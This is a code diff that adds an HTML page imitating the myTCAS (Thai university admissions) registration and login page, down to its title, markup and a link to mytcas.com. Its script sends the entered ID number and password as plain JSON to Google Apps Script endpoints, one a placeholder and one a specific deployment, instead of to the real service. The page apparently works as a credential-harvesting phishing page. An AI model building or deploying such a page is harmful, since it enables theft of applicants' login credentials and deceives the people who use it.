@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ลงทะเบียน • เข้าสู่ระบบ</title>
+</head>
+<body>
+    <div id="root">
+        <div id="tcas">
+            <header class="site-header">
+                <nav class="site-nav">
+                    <ul>
+                        <li class="m-home"><a href="https://www.mytcas.com"><span>หน้าแรก</span></a></li>
+                        <li class="m-register active"><a href="/"><span>เข้าสู่ระบบ</span></a></li>
+                    </ul>
+                </nav>
+            </header>
+            <main class="site-body">
+                <div class="t-form">
+                    <h1>ลงทะเบียน • เข้าสู่ระบบ</h1>
+                    <div class="t-row">
+                        <div class="col required">
+                            <label class="has-meta"><span>เลขประจำตัว</span></label>
+                            <input type="text" id="username" required="">
+                        </div>
+                    </div>
+                    <div class="t-row">
+                        <div class="col required">
+                            <label class="has-meta"><span>รหัสผ่าน</span></label>
+                            <input type="password" id="password" required="">
+                        </div>
+                    </div>
+                    <div class="action">
+                        <button class="btn-main" id="registerButton">ลงทะเบียน</button>
+                        <button class="btn-main" id="loginButton">เข้าสู่ระบบ</button>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('registerButton').addEventListener('click', function() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var data = {
+                "username": username,
+                "password": password
+            };
+
+            fetch('https://script.google.com/macros/s/your-script-id/exec', {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.result === "success") {
+                    alert('ลงทะเบียนสำเร็จ');
+                } else {
+                    alert('เกิดข้อผิดพลาด: ' + data.message);
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+
+        document.getElementById('loginButton').addEventListener('click', function() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            var data = {
+                "username": username,
+                "password": password
+            };
+
+            fetch('https://script.google.com/macros/s/AKfycbwLUQS7RGxDFIH6-dLCAj16MYhQCFgLQZsJF-7QXKlaUqsQ-6YDsooabWqP3nceSQXS/exec', {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.result === "success") {
+                    alert('เข้าสู่ระบบสำเร็จ');
+                } else {
+                    alert('เกิดข้อผิดพลาด: ' + data.message);
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
